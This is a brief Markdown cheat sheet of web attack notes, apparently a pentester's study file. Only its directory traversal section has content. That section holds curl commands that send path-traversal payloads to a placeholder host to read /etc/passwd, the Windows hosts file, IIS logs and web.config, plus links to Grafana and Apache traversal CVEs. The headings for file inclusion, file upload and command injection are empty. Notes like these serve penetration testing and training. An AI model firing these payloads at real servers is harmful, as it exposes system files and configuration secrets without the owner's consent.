# Directory traversal

Example: `curl http://vulnsite/index.php?page=../../../../../../etc/passwd`
Windows (check both `/` and `\`):
```
curl http://vulnsite/index.php?page=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
curl http://vulnsite/index.php?page=../../../../../../inetpub\logs\LogFiles\W3SVC1\
curl http://vulnsite/index.php?page=../../../../../../wwwroot\web.config
```

Grafana CVE: https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/
Apache 2.4.49 CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773

## File inclusion

## File upload

## Command injection


